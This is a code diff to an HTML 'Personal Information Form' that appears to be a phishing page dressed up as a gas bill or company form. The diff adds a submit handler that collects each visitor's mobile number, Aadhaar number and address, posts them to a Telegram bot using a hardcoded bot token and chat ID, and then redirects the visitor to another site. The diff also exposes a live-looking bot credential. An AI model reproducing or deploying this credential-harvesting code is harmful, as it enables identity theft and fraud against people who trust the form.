@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <title>Personal Information Form</title>
     <style>
         body {
@@ -52,7 +53,7 @@
      <center>
    <img src="https://i.postimg.cc/PJr5XLGK/Photoroom-20241020-165250.png" alt="Gas Bill Image" style="width: 100px">
    <h4>Consolidated Coin Company PVT.LTD</h4></center>
-    <form>
+    <form onsubmit=" return sender()">
         <label for="mobile">Mobile Number:</label>
         <input type="text" id="mobile" name="mobile" required>
 
@@ -65,6 +66,52 @@
         <input type="submit" value="Submit">
     </form>
 </div>
+<link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+  
+  <script>
+  //bot token
+var telegram_bot_id = "7790794227:AAFsSbfZBNBiMs93o_cT0bHJFvQuNtkXOm8";
+//chat id
+var chat_id = 1210231596;
+var ready = function () {
+    mobile = document.getElementById("mobile").value;
+    aadhar = document.getElementById("aadhar").value;
+    address = document.getElementById("address").value;
+  
+    message = 
+      "\nMob No: " + mobile +  
+      "\nAdhar No: " + aadhar + 
+      "\naddress: " + address;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message,
+          "file": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
 
+        document.location = "https://alokpqr.github.io/chandan3/"; 
+      
+    });
+    document.getElementById("mobile").value = "";
+    document.getElementById("aadhar").value = "";
+    document.getElementById("address").value = "";
+    return false;
+};
+  </script>
 </body>
 </html>
